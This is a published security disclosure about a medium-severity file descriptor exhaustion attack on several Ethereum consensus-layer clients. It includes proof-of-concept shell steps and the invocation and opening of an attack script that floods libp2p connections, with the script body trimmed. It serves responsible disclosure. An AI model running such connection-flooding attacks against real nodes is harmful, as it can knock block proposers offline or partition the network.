# [M] CL-2022-06: Exhausting File Descriptors

## Summary
Severity: Medium
Chain: Ethereum (consensus layer)
Component: Nimbus, Lodestar, Lighthouse, Prysm, Besu
Published: 2023-05-03
Source: https://notes.ethereum.org/VNxP3BsuSqSDKnb8PsGr2A?view=
Type: ef-disclosure

## Details
# File Descriptor Attack

### Bug Hunter
Jonny Rhea

### Summary
An attacker can cause a node to hold on to an arbitrarily large number of file descriptors and effectively disabling it. This allows an attacker to for example target block proposers or create a coordinated network partition attack.


### POC
1. Launch the client
2. Check max file descriptors allowed
    ```bash
    $ cat /proc/`(ps aux | grep -v grep |grep -i CLIENTNAME | awk '{print $2;}')`/limits |grep 'open files'
    Limit                     Soft Limit           Hard Limit           Unit
    Max open files            1024              1024              files
    ```
3. Check how many file descriptors are open:
    ```bash
    $ ls -U /proc/`(ps aux | grep -v grep |grep -i CLIENTNAME | awk '{print $2;}')`/fd | wc -l
    ```
4. Launch attack script.
    ```bash
    $ ./attack.sh 192.168.1.16 9000 .01
    ```
The following script is capable of opening thousands of connections to a node at the libp2p layer and leaving them to time out naturally:

```bash
    #!/bin/bash

    # Usage: 
    # 
    # ./attack.sh IP PORT SLEEP
    # ./attack.sh 192.168.0.123 9000 .01

    set -e
    trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

```

_Trimmed to 38 lines — full report: https://notes.ethereum.org/VNxP3BsuSqSDKnb8PsGr2A?view=_
